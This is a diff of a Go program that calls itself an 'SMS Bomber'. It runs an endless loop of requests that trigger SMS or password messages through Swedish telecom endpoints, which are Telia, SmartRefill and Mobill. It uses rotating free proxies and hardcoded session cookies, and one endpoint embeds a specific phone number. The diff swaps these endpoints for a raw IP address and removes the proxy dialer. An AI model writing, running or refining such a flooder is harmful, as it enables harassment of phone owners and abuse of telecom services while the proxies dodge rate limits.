@@ -13,7 +13,6 @@ import (
 
 	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
-	"github.com/valyala/fasthttp/fasthttpproxy"
 )
 
 var host, err = os.Hostname()
@@ -22,14 +21,14 @@ func main() {
 
 	// Ensure there are proxies available
 
-	fmt.Println("loading sms :: atomic/scripts/smsbomb")
+	fmt.Println("Starting SMS Bomber - Created by Lunar")
 	for {
 		StartALL()
 		time.Sleep(time.Millisecond * 1)
 	}
 }
 
-var proxyList = fetchProxies("https://raw.githubusercontent.com/Jakee8718/Free-Proxies/main/proxy/http.txt")
+var proxyList = fetchProxies("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
 
 func fetchProxies(uri string) []string {
 	resp, err := http.Get(uri)
@@ -55,7 +54,7 @@ func StartALL() {
 }
 func Telia1() {
 
-	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -84,10 +83,7 @@ func Telia1() {
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
 
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-	err := client.Do(req, resp)
+	err := fasthttp.Do(req, resp)
 
 	if err != nil {
 		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
@@ -100,7 +96,7 @@ func Telia1() {
 }
 func Laddkod() {
 
-	url := "https://teliase.smartrefill.se/Refill/api/TELIA/v1/passwords/0726415603" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -126,10 +122,7 @@ func Laddkod() {
 	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
 	req.SetRequestURI(url)
 
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-	err := client.Do(req, resp)
+	err := fasthttp.Do(req, resp)
 
 	if err != nil {
 		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
@@ -142,7 +135,7 @@ func Laddkod() {
 }
 func ProdMobil2() {
 
-	url := "https://prod2.mobill.se/mspRequest" // Replace with your API endpoint
+	url := "http://37.187.56.77" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -171,10 +164,8 @@ func ProdMobil2() {
 	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
 	req.SetRequestURI(url)
 	req.SetBodyString(data)
-	client := fasthttp.Client{
-		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
-	}
-	err := client.Do(req, resp)
+
+	err := fasthttp.Do(req, resp)
 
 	if err != nil {
 		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>"+strconv.Itoa(resp.StatusCode())+"</>] ::", proxy)
